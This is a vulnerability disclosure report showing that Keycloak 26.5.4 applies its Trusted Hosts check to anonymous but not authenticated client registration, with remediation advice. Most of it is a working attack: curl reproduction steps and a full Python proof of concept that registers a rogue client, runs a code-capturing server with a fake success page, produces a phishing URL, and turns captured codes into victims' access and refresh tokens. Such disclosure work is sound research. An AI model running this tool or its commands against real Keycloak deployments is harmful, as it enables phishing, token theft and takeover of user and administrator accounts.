# Finding #5: DCR Trusted Hosts Bypass — Live Token Theft via Phishing

| Field | Value |
|---|---|
| **Severity** | HIGH (CVSS 8.0) |
| **Affected Version** | Keycloak 26.5.4 (latest stable, reproduction confirmed) |
| **Vulnerability Type** | Broken Access Control / Privilege Escalation via Client Registration Policy Bypass |
| **Affected Components** | DCR Endpoint (`/realms/{realm}/clients-registrations/openid-connect`), Client Registration Policy Engine |
| **Validation Date** | 2026-02-21 |
| **Researcher** | Anggi Pradana |

---

## Summary

Dynamic Client Registration (DCR) policy "Trusted Hosts" only applies to anonymous registrations. A user with the `create-client` role (realm-management) can register an OIDC client with any `redirect_uris` (including to an attacker-controlled server) via authenticated DCR. This enables a live phishing attack: the attacker generates a phishing URL from the real Keycloak domain, runs a capture server, waits for the victim to login, then automatically steals the victim's token.

---

## Configuration Context

Default DCR policy configuration. The `Trusted Hosts` policy exists in subType `anonymous` but is **absent** from subType `authenticated`. The `create-client` role (realm-management) is typically delegated to developers for self-service client registration.

---

## Detailed Description

### End-to-End Attack Flow

```
Attacker (has create-client role)
    │
    ├─ 1. Login, obtain Bearer token
    ├─ 2. Register malicious client via DCR (redirect_uri → attacker's server)
    ├─ 3. Generate phishing URL (real Keycloak domain)
    ├─ 4. Start HTTP server to capture auth codes
    ├─ 5. Send phishing URL to victim
    │
    │  ┌─ Victim clicks phishing URL
    │  ├─ Sees the REAL Keycloak login page (100% legitimate)
    │  ├─ Logs in with their credentials
    │  └─ Redirected to attacker's server (auth code sent)
    │
    ├─ 6. Attacker's server captures auth code
    ├─ 7. Exchange auth code → access token + refresh token of victim
    └─ 8. Full access to victim's account
```

### Policy Analysis

Keycloak's DCR endpoint has two modes of operation:

- **`anonymous`** — No authentication; protected by the "Trusted Hosts" policy which validates redirect URIs.
- **`authenticated`** — Requires Bearer token; has a separate policy set.

The `Trusted Hosts` policy (which validates `redirect_uris`) **only exists in subType `anonymous`**. SubType `authenticated` has no URI validation whatsoever.

| Policy | subType `anonymous` | subType `authenticated` |
|---|---|---|
| Trusted Hosts (`client-uris-must-match`) | Enforced | **ABSENT** |
| Allowed Protocol Mapper Types | Enforced | Enforced |
| Allowed Client Scopes | Enforced | Enforced |
| Max Clients Limit | Enforced | Absent |
| Consent Required | Enforced | Absent |

### Privilege Boundary Verification

| Action | Endpoint | Result |
|---|---|---|
| `create-client` role → DCR with any redirect | `/realms/{realm}/clients-registrations/openid-connect` | **201 Created (SUCCESS)** |
| `create-client` role → Admin REST API | `/admin/realms/{realm}/clients` | **403 Forbidden (BLOCKED)** |
| Anonymous DCR with redirect to attacker | `/realms/{realm}/clients-registrations/openid-connect` | **403 "Trusted Hosts" rejected** |

The registered malicious client:
- **Immediately active** — no admin approval needed
- **Fully functional** — can initiate authorization code flow
- **Has a client secret** — attacker can exchange auth code for tokens

---

## Steps to Reproduce

**Prerequisites:**
- Realm: `test`
- Attacker: `testuser / Password123` with `create-client` role
- Victim: `victim / Password123`

### Step 1 — Assign create-client role (admin setup)

```bash
ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

RM_CLIENT=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/clients?clientId=realm-management" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://46.101.162.187:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

### Step 2 — Attacker login and obtain token

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

### Step 3 — Register malicious client with redirect to attacker's server

```bash
REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Aplikasi Resmi Perusahaan",
    "redirect_uris": ["http://46.101.162.187:48888/callback"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')
echo "$REG_RESP" | python3 -m json.tool
```

**Response (201 Created — WITHOUT Trusted Hosts rejection):**

```json
{
  "client_id": "425bebcb-4dc1-4467-adf1-6d20815712b3",
  "client_secret": "YDEWNkAWu6BanGdCamm8wGGZmHcWXz7D",
  "redirect_uris": ["http://46.101.162.187:48888/callback"],
  "grant_types": ["authorization_code", "refresh_token"]
}
```

### Step 4 — Control: Anonymous DCR (correctly rejected)

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name":"anon-test","redirect_uris":["http://46.101.162.187:48888/callback"]}'
```

```json
{
  "error": "insufficient_scope",
  "error_description": "Policy 'Trusted Hosts' rejected request... Host not trusted."
}
```

### Step 5 — Start auth code capture server + Generate phishing URL

Attacker starts an HTTP listener server then generates the phishing URL:

```
http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?
  client_id=425bebcb-4dc1-4467-adf1-6d20815712b3&
  response_type=code&
  redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback&
  scope=openid+profile+email
```

This URL is 100% legitimate — real Keycloak domain. The victim has no reason to be suspicious.

### Step 6 — Victim clicks URL, logs in, auth code captured

Victim sees the real Keycloak login page. After logging in, Keycloak redirects to the attacker's server:

```
HTTP 302 → http://46.101.162.187:48888/callback?code=7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
```

The attacker's server automatically captures the auth code and displays a fake "Login Successful!" page to the victim.

### Step 7 — Attacker exchanges auth code → victim's token

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=425bebcb-...&client_secret=YDEWNkAW...&grant_type=authorization_code&code=7e7cad47-...&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback"
```

**Victim's token successfully stolen:**

```
Username     : victim
Email        : victim@test.com
Full Name    : Victim User
Scope        : openid profile email
Access Token : eyJhbGciOiJSUzI1NiIsInR5cCI...
Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...
```

### Step 8 — Verify: access victim data

```bash
curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1Ni..."
```

```json
{
  "email_verified": true,
  "name": "Victim User",
  "preferred_username": "victim",
  "email": "victim@test.com"
}
```

---

## Impact

- **Full token theft:** A user with the `create-client` role can steal the token of any user in the realm, including administrators, by registering a malicious client and phishing via the real Keycloak login page.
- **No compromise indicators for the victim:** The login page is on the real Keycloak domain with HTTPS. There are no suspicious UI elements, no browser warnings.
- **Persistent access:** The stolen refresh token provides ongoing access until the victim changes their password.
- **Bypasses all redirect_uri allowlisting:** The `Trusted Hosts` protection configured by the admin does not apply to authenticated DCR.
- **Scales to all users in the realm:** A single malicious client registration can phish all users. The attacker only needs to distribute the URL.

---

## Recommendations

1. **Apply the `Trusted Hosts` policy to subType `authenticated`.** The same URI validation must be enforced for authenticated registrations. This is the primary fix.
2. **Require admin approval for DCR clients.** Add a `client-disabled` policy to the authenticated subType so new clients require admin activation before they can initiate auth flows.
3. **Add URI domain validation to the `authenticated` policy set.** Restrict `redirect_uris` to pre-approved domains.
4. **Audit clients already registered via DCR** for redirect URIs that should not be there.

---

## Proof of Concept — Full Source Code

**File:** `pocs/poc_f5_dcr_hijack.py`

**Usage:**

```bash
# Interactive mode (wait for victim to open URL in browser):
python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888

# Automated mode (simulate victim for testing):
python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --auto-victim --timeout 30
```

**Parameters:**
- `--host` — Keycloak URL (default: http://46.101.162.187:8080)
- `--listen-port` — Attacker's phishing server port (default: 48888)
- `--realm` — Target realm (default: test)
- `--timeout` — Timeout waiting for victim in seconds (default: 300)
- `--auto-victim` — Automatically simulate victim login (for testing/CI)

**Source:**

```python
#!/usr/bin/env python3
"""
Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack + Token Theft
Severity: HIGH (CVSS 8.0)
Target: Keycloak 26.5.4

Automated end-to-end attack:
1. Register malicious client via authenticated DCR (bypasses Trusted Hosts)
2. Generate ready-to-send phishing URL
3. Start HTTP listener server, wait for victim to click & log in
4. Capture auth code from redirect, exchange for victim's tokens
5. Display stolen victim data

Usage:
  python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080
  python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888 --timeout 600
"""

import http.client
import http.server
import json
import base64
import argparse
import sys
import re
import socket
import time
import threading
import urllib.parse

# ═══ ANSI Colors ═══
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# ═══ Global: store captured auth code ═══
captured_code = None
captured_event = threading.Event()


def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #5: DCR Trusted Hosts Bypass                        ║
║  Live Phishing Attack — Automated Token Theft                ║
║  Keycloak 26.5.4 — CVSS 8.0 (HIGH)                         ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def step(n, msg):
    print(f"\n{BOLD}{CYAN}[Step {n}]{RESET} {BOLD}{msg}{RESET}")


def success(msg):
    print(f"  {GREEN}[+]{RESET} {msg}")


def fail(msg):
    print(f"  {RED}[-]{RESET} {msg}")


def info(msg):
    print(f"  {BLUE}[*]{RESET} {msg}")


def warn(msg):
    print(f"  {YELLOW}[!]{RESET} {msg}")


# ═══ HTTP Helpers ═══

def http_post_form(host, port, path, data, token=None):
    """POST form-urlencoded, return (status, dict)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = urllib.parse.urlencode(data) if isinstance(data, dict) else data
    conn.request("POST", path, body, headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_post_json(host, port, path, data, token=None):
    """POST JSON, return (status, dict)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("POST", path, json.dumps(data), headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_get_json(host, port, path, token=None):
    """GET JSON, return (status, dict/list)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def get_admin_token(port):
    """Get admin token via localhost"""
    status, data = http_post_form("localhost", port,
        "/realms/master/protocol/openid-connect/token",
        {"client_id": "admin-cli", "grant_type": "password",
         "username": "admin", "password": "Admin1234"})
    return data.get("access_token", "")


def decode_jwt(token):
    """Decode JWT payload without verification"""
    payload = token.split(".")[1]
    payload += "=" * (4 - len(payload) % 4)
    return json.loads(base64.b64decode(payload))


# ═══ Phishing Server (Captures Auth Code from Victim) ═══

class PhishingHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that captures auth code from Keycloak redirect."""

    def do_GET(self):
        global captured_code
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)

        if "code" in params:
            captured_code = params["code"][0]

            # Show fake "success" page to victim
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Login Successful</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         text-align: center; padding: 60px 20px; background: #f0f2f5; color: #333; }
  .card { background: #fff; padding: 48px; border-radius: 12px; max-width: 420px;
          margin: 0 auto; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
  .icon { font-size: 72px; color: #4CAF50; margin-bottom: 16px; }
  h2 { margin: 0 0 8px; font-size: 24px; }
  p { color: #666; margin: 4px 0; font-size: 15px; }
  .small { color: #aaa; font-size: 12px; margin-top: 24px; }
</style></head><body>
<div class="card">
  <div class="icon">&#10004;</div>
  <h2>Login Successful!</h2>
  <p>You have been successfully signed in.</p>
  <p class="small">You may close this page.</p>
</div></body></html>"""
            self.wfile.write(html.encode())

            # Notify attacker terminal
            print(f"\n  {RED}{BOLD}{'=' * 55}{RESET}")
            print(f"  {RED}{BOLD}  *** VICTIM AUTH CODE CAPTURED! ***{RESET}")
            print(f"  {RED}{BOLD}{'=' * 55}{RESET}")
            print(f"  {RED}  Code: {captured_code[:50]}...{RESET}")
            print(f"  {RED}{BOLD}{'=' * 55}{RESET}")

            captured_event.set()
        else:
            # Other requests (favicon, etc.)
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body>Loading...</body></html>")

    def log_message(self, format, *args):
        pass  # Suppress default logging


def start_phishing_server(port):
    """Start HTTP server on background thread."""
    class ReusableServer(http.server.HTTPServer):
        allow_reuse_address = True
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            super().server_bind()

    server = ReusableServer(("0.0.0.0", port), PhishingHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ═══ Main ═══

def main():
    parser = argparse.ArgumentParser(
        description="PoC Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="Keycloak URL (default: http://46.101.162.187:8080)")
    parser.add_argument("--listen-port", type=int, default=48888,
                        help="Port for attacker phishing server (default: 48888)")
    parser.add_argument("--realm", default="test",
                        help="Target realm (default: test)")
    parser.add_argument("--timeout", type=int, default=300,
                        help="Timeout waiting for victim in seconds (default: 300)")
    parser.add_argument("--auto-victim", action="store_true",
                        help="Automatically simulate victim login (for testing/CI)")
    args = parser.parse_args()

    # Parse host
    parsed = urllib.parse.urlparse(args.host)
    kc_host = parsed.hostname
    kc_port = parsed.port or 8080
    public_ip = "46.101.162.187"
    listen_port = args.listen_port
    realm = args.realm
    callback_url = f"http://{public_ip}:{listen_port}/callback"
    results = []

    banner()
    info(f"Target Keycloak  : {kc_host}:{kc_port}")
    info(f"Phishing server  : {public_ip}:{listen_port}")
    info(f"Victim timeout   : {args.timeout}s")

    # ══════════════════════════════════════════════════════════════
    # STEP 0: Setup — Ensure testuser has create-client role
    # ══════════════════════════════════════════════════════════════
    step(0, "Setup — Assign create-client role to testuser")

    admin_token = get_admin_token(kc_port)
    if not admin_token:
        fail("Failed to get admin token! Ensure Keycloak is running.")
        return 1
    success("Admin token OK")

    _, users = http_get_json("localhost", kc_port,
        f"/admin/realms/{realm}/users?username=testuser", admin_token)
    if not users or not isinstance(users, list) or len(users) == 0:
        fail("testuser not found! Create it in Admin Console first.")
        return 1
    user_id = users[0]["id"]
    info(f"testuser ID: {user_id}")

    _, rm_clients = http_get_json("localhost", kc_port,
        f"/admin/realms/{realm}/clients?clientId=realm-management", admin_token)
    rm_client_id = rm_clients[0]["id"]

    _, create_role = http_get_json("localhost", kc_port,
        f"/admin/realms/{realm}/clients/{rm_client_id}/roles/create-client", admin_token)

    http_post_json("localhost", kc_port,
        f"/admin/realms/{realm}/users/{user_id}/role-mappings/clients/{rm_client_id}",
        [create_role], admin_token)
    success("create-client role assigned to testuser")

    # ══════════════════════════════════════════════════════════════
    # STEP 1: Attacker login
    # ══════════════════════════════════════════════════════════════
    step(1, "ATTACKER — Login as testuser (has create-client role)")

    status, data = http_post_form(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/token",
        {"client_id": "webapp", "grant_type": "password",
         "username": "testuser", "password": "Password123", "scope": "openid"})

    attacker_token = data.get("access_token", "")
    if not attacker_token:
        fail(f"Login failed: {data}")
        return 1
    success(f"Login successful — token: {attacker_token[:40]}...")

    # ══════════════════════════════════════════════════════════════
    # STEP 2: Register malicious client via authenticated DCR
    # ══════════════════════════════════════════════════════════════
    step(2, "ATTACKER — Register malicious client via Dynamic Client Registration")

    info(f"Redirect URI to attacker server: {callback_url}")

    dcr_data = {
        "client_name": "Official Company App",
        "redirect_uris": [callback_url],
        "grant_types": ["authorization_code", "refresh_token"],
        "response_types": ["code"],
        "token_endpoint_auth_method": "client_secret_basic"
    }

    status, reg_resp = http_post_json(kc_host, kc_port,
        f"/realms/{realm}/clients-registrations/openid-connect",
        dcr_data, attacker_token)

    if "client_id" not in reg_resp:
        fail(f"DCR failed (HTTP {status}): {reg_resp}")
        return 1

    mal_client_id = reg_resp["client_id"]
    mal_secret = reg_resp.get("client_secret", "")

    success("Malicious client REGISTERED successfully!")
    print(f"    {MAGENTA}Client ID     : {mal_client_id}{RESET}")
    print(f"    {MAGENTA}Client Secret : {mal_secret}{RESET}")
    print(f"    {MAGENTA}Redirect URI  : {callback_url}{RESET}")
    print(f"    {MAGENTA}Client Name   : Official Company App{RESET}")
    warn("Trusted Hosts policy NOT enforced for authenticated DCR!")
    results.append(("DCR bypass (malicious client registered)", True))

    # ══════════════════════════════════════════════════════════════
    # STEP 3: Control — Anonymous DCR should be blocked
    # ══════════════════════════════════════════════════════════════
    step(3, "CONTROL — Anonymous DCR (no authentication)")

    status, anon_resp = http_post_json(kc_host, kc_port,
        f"/realms/{realm}/clients-registrations/openid-connect",
        {"client_name": "anon-test", "redirect_uris": [callback_url]})

    anon_desc = anon_resp.get("error_description", anon_resp.get("error", str(anon_resp)))
    if status == 403 or "Trusted Hosts" in str(anon_resp):
        success(f"Anonymous DCR BLOCKED (correct): {anon_desc[:80]}")
        results.append(("Control: Anonymous DCR blocked", True))
    else:
        warn(f"Anonymous DCR not blocked (HTTP {status})")
        results.append(("Control: Anonymous DCR blocked", False))

    info("Policy gap confirmed: Anonymous=BLOCKED, Authenticated=ALLOWED")

    # ══════════════════════════════════════════════════════════════
    # STEP 4: Start phishing server
    # ══════════════════════════════════════════════════════════════
    step(4, "ATTACKER — Start phishing server (auth code catcher)")

    server = start_phishing_server(listen_port)
    success(f"Phishing server active on 0.0.0.0:{listen_port}")
    info("Server will capture auth code when victim is redirected here")

    # ══════════════════════════════════════════════════════════════
    # STEP 5: Generate phishing URL
    # ══════════════════════════════════════════════════════════════
    step(5, "ATTACKER — Generate phishing URL")

    phishing_url = (
        f"http://{public_ip}:{kc_port}/realms/{realm}/protocol/openid-connect/auth"
        f"?client_id={mal_client_id}"
        f"&response_type=code"
        f"&redirect_uri={urllib.parse.quote(callback_url, safe='')}"
        f"&scope=openid+profile+email"
    )

    print(f"""
  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
  ║              PHISHING URL READY TO SEND                      ║
  ╚══════════════════════════════════════════════════════════════╝{RESET}

  {BOLD}{WHITE}Send this URL to the target victim:{RESET}

  {CYAN}{BOLD}{phishing_url}{RESET}

  {YELLOW}> This URL looks 100% legitimate (real Keycloak domain)
  > Victim will see the real Keycloak login page
  > After login, auth code is automatically sent to our server
  > Victim sees a fake "Login Successful" page{RESET}

  {BOLD}Waiting for victim to click the URL and log in...{RESET}
  {DIM}(Open the URL above in a browser to simulate victim){RESET}
  {DIM}Timeout: {args.timeout}s{RESET}
""")

    # ══════════════════════════════════════════════════════════════
    # STEP 6: Wait for victim
    # ══════════════════════════════════════════════════════════════
    step(6, f"Waiting for victim to log in... (timeout {args.timeout}s)")

    if args.auto_victim:
        info("--auto-victim mode: automatically simulating victim login...")
        victim_thread = threading.Thread(
            target=simulate_victim_login,
            args=(kc_host, kc_port, realm, mal_client_id, callback_url),
            daemon=True)
        victim_thread.start()

    # Waiting animation
    start_time = time.time()
    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    idx = 0
    while not captured_event.is_set():
        elapsed = int(time.time() - start_time)
        remaining = args.timeout - elapsed
        if remaining <= 0:
            break
        print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
              f"Waiting for victim... ({elapsed}s / {args.timeout}s) "
              f"— Open URL in browser to simulate", end="", flush=True)
        idx += 1
        captured_event.wait(timeout=0.3)

    print("\r" + " " * 80 + "\r", end="")  # Clear spinner line

    if not captured_code:
        fail(f"Timeout — no victim logged in within {args.timeout} seconds")
        print(f"\n  {YELLOW}Tip: Open the phishing URL in a browser, login as victim/Password123{RESET}")
        server.shutdown()
        print_summary(results)
        return 1

    success("Victim auth code captured!")
    info(f"Auth code: {captured_code[:50]}...")
    results.append(("Auth code captured via redirect", True))

    # ══════════════════════════════════════════════════════════════
    # STEP 7: Exchange auth code for victim tokens
    # ══════════════════════════════════════════════════════════════
    step(7, "ATTACKER — Exchange stolen auth code for victim tokens")

    status, token_resp = http_post_form(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/token",
        {"client_id": mal_client_id,
         "client_secret": mal_secret,
         "grant_type": "authorization_code",
         "code": captured_code,
         "redirect_uri": callback_url})

    if "access_token" not in token_resp:
        fail(f"Token exchange failed: {token_resp}")
        server.shutdown()
        print_summary(results)
        return 1

    claims = decode_jwt(token_resp["access_token"])

    print(f"""
  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
  ║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
  ╚══════════════════════════════════════════════════════════════╝{RESET}

    {BOLD}Username     :{RESET} {RED}{claims.get('preferred_username', 'N/A')}{RESET}
    {BOLD}Email        :{RESET} {RED}{claims.get('email', 'N/A')}{RESET}
    {BOLD}Full Name    :{RESET} {RED}{claims.get('name', 'N/A')}{RESET}
    {BOLD}User ID      :{RESET} {RED}{claims.get('sub', 'N/A')}{RESET}
    {BOLD}Scope        :{RESET} {RED}{token_resp.get('scope', 'N/A')}{RESET}
    {BOLD}Access Token :{RESET} {RED}{token_resp['access_token'][:60]}...{RESET}
    {BOLD}Refresh Token:{RESET} {RED}{token_resp.get('refresh_token', '')[:60]}...{RESET}

  {YELLOW}{BOLD}Attacker now has full access to victim's account!{RESET}
""")
    results.append(("Victim token stolen", True))

    # ══════════════════════════════════════════════════════════════
    # STEP 8: Verify — access victim data
    # ══════════════════════════════════════════════════════════════
    step(8, "ATTACKER — Verify access to victim data with stolen token")

    status, userinfo = http_get_json(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/userinfo",
        token_resp["access_token"])

    if status == 200:
        success("Victim userinfo accessed successfully:")
        for k, v in userinfo.items():
            if k not in ("sub",):
                print(f"    {k}: {v}")
        results.append(("Victim data access verified", True))
    else:
        warn(f"Userinfo failed (HTTP {status})")
        results.append(("Victim data access verified", False))

    server.shutdown()
    print_summary(results)
    return 0


def simulate_victim_login(kc_host, kc_port, realm, client_id, redirect_uri):
    """Automatically simulate victim login (for --auto-victim mode)."""
    time.sleep(2)

    try:
        auth_path = (
            f"/realms/{realm}/protocol/openid-connect/auth"
            f"?client_id={client_id}&response_type=code"
            f"&redirect_uri={urllib.parse.quote(redirect_uri, safe='')}"
            f"&scope=openid+profile+email"
        )

        conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
        conn.request("GET", auth_path)
        resp = conn.getresponse()
        body = resp.read().decode()
        cookies_raw = [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]
        location = resp.getheader("Location", "")
        status = resp.status
        conn.close()

        cookies = {}
        for c in cookies_raw:
            part = c.split(";")[0]
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k] = v

        while status in (302, 303) and location:
            if location.startswith("http"):
                loc_parsed = urllib.parse.urlparse(location)
                loc_path = loc_parsed.path + ("?" + loc_parsed.query if loc_parsed.query else "")
            else:
                loc_path = location

            conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
            conn.request("GET", loc_path, headers={"Cookie": cookie_str} if cookie_str else {})
            resp = conn.getresponse()
            body = resp.read().decode()
            for c in [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]:
                part = c.split(";")[0]
                if "=" in part:
                    k, v = part.split("=", 1)
                    cookies[k] = v
            location = resp.getheader("Location", "")
            status = resp.status
            conn.close()

        action_match = re.search(r'action="([^"]+)"', body)
        if not action_match:
            return

        action_url = action_match.group(1).replace("&amp;", "&")
        if action_url.startswith("http"):
            action_parsed = urllib.parse.urlparse(action_url)
            action_path = action_parsed.path + ("?" + action_parsed.query if action_parsed.query else "")
        else:
            action_path = action_url

        login_body = "username=victim&password=Password123&credentialId="
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
        conn.request("POST", action_path, login_body, {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": cookie_str
        })
        resp = conn.getresponse()
        resp.read()
        redirect_location = resp.getheader("Location", "")
        conn.close()

        if redirect_location and str(listen_port_global) in redirect_location:
            redir_parsed = urllib.parse.urlparse(redirect_location)
            conn = http.client.HTTPConnection(redir_parsed.hostname, redir_parsed.port, timeout=10)
            conn.request("GET", redir_parsed.path + "?" + redir_parsed.query)
            conn.getresponse().read()
            conn.close()

    except Exception:
        pass


listen_port_global = 48888


def print_summary(results):
    """Display test results summary."""
    vuln_count = sum(1 for _, v in results if v)

    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                    RESULTS SUMMARY                           ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}SECURE{RESET}"
        print(f"  {name:45s} {status_str}")

    print(f"""
{YELLOW}Attack Impact:{RESET}
  - User with create-client role can steal tokens of ANY realm user
  - Victim sees 100% legitimate Keycloak login page (trusted domain)
  - Stolen refresh token provides persistent access to victim account
  - One malicious client can phish all users in the realm

{YELLOW}Policy Gap:{RESET}
  - Anonymous DCR   : Trusted Hosts ENFORCED (correctly blocks)
  - Authenticated DCR: Trusted Hosts NOT PRESENT (allows any redirect_uri)
  - Admin REST API  : Returns 403 (correctly blocks)

{YELLOW}Root Cause:{RESET}
  The "Trusted Hosts" client registration policy only exists in the
  "anonymous" subType. The "authenticated" subType has no URI
  restriction policy whatsoever.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] VULNERABILITY CONFIRMED — {vuln_count}/{len(results)} tests positive{RESET}")
    else:
        print(f"{GREEN}{BOLD}[+] All tests passed — not vulnerable{RESET}")


if __name__ == "__main__":
    listen_port_global = 48888
    for i, arg in enumerate(sys.argv):
        if arg == "--listen-port" and i + 1 < len(sys.argv):
            listen_port_global = int(sys.argv[i + 1])
    sys.exit(main())
```

---

*This finding was validated on 2026-02-21 against a fresh Keycloak 26.5.4 instance on the researcher's private VPS. No production systems, real user data, or third-party infrastructure was accessed.*
